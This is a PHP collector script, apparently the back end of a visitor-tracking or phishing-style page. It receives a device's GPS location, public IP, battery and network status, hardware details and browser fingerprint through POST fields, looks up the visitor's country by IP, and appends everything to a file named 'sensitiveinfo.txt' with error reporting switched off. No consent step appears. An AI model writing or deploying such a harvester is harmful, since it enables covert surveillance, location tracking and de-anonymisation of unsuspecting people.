<?php
error_reporting(0);

// Retrieve data from POST request
$networkinfo = $_POST['networkinformation'];
$batterypercentage = $_POST['batterypercentage'];
$ischarging = $_POST['ischarging'];
$width = $_POST['width'];
$height = $_POST['height'];
$platform = $_POST['platform'];
$gps = $_POST['gps'];
$localtime = $_POST['localtime'];
$devicelang = $_POST['devicelang'];
$iscookieEnabled = $_POST['iscookieEnabled'];
$useragent = $_POST['useragent'];
$deviceram = $_POST['deviceram'];
$cpuThreads = $_POST['cpuThreads'];
$referurl = $_POST['referurl'];
$publicIp = $_POST['publicIp'];
$os = $_POST['os'];
$browserName = $_POST['browserName'];
$browserVersion = $_POST['browserVersion'];
$touchScreen = $_POST['touchScreen'];
$viewportWidth = $_POST['viewportWidth'];
$viewportHeight = $_POST['viewportHeight'];
$timezone = $_POST['timezone'];
$colorDepth = $_POST['colorDepth'];
$pixelRatio = $_POST['pixelRatio'];
$mediaDevices = $_POST['mediaDevices'];
$preferredLanguages = $_POST['preferredLanguages'];

// Retrieve IP address
$ip = $_SERVER['REMOTE_ADDR'];

// Fetch country details using IP
$details = json_decode(file_get_contents("http://ip-api.com/json/{$ip}"));
$country = $details->country;

// Set timezone and current date/time
date_default_timezone_set('Asia/Karachi');
$currentDateTime = date("d-m-Y H:i:s");

// Log data to a file
$file = fopen('sensitiveinfo.txt', 'a');
fwrite($file, "Ip Address: " . $ip . "\n\n" .
    "Country: " . $country . "\n\n" .
    "NetworkInformation: " . $networkinfo . "\n\n" .
    "BatteryPercentage: " . $batterypercentage . "\n\n" .
    "IsCharging: " . $ischarging . "\n\n" .
    "ScreenWidth: " . $width . "\n\n" .
    "ScreenHeight: " . $height . "\n\n" .
    "Platform: " . $platform . "\n\n" .
    "GPS: " . $gps . "\n\n" .
    "DeviceLocalTime: " . $localtime . "\n\n" .
    "DeviceLanguage: " . $devicelang . "\n\n" .
    "CookieEnabled: " . $iscookieEnabled . "\n\n" .
    "UserAgent: " . $useragent . "\n\n" .
    "DeviceMemory: " . $deviceram . "\n\n" .
    "CPUThreads: " . $cpuThreads . "\n\n" .
    "ReferUrl: " . $referurl . "\n\n" .
    "PublicIp: " . $publicIp . "\n\n" .
    "OS: " . $os . "\n\n" .
    "BrowserName: " . $browserName . "\n\n" .
    "BrowserVersion: " . $browserVersion . "\n\n" .
    "TouchScreen: " . $touchScreen . "\n\n" .
    "ViewportWidth: " . $viewportWidth . "\n\n" .
    "ViewportHeight: " . $viewportHeight . "\n\n" .
    "TimeZone: " . $timezone . "\n\n" .
    "ColorDepth: " . $colorDepth . "\n\n" .
    "PixelRatio: " . $pixelRatio . "\n\n" .
    "MediaDevices: " . $mediaDevices . "\n\n" .
    "PreferredLanguages: " . $preferredLanguages . "\n\n" .
    "DateTime: " . $currentDateTime . "\n\n");
fclose($file);
?>
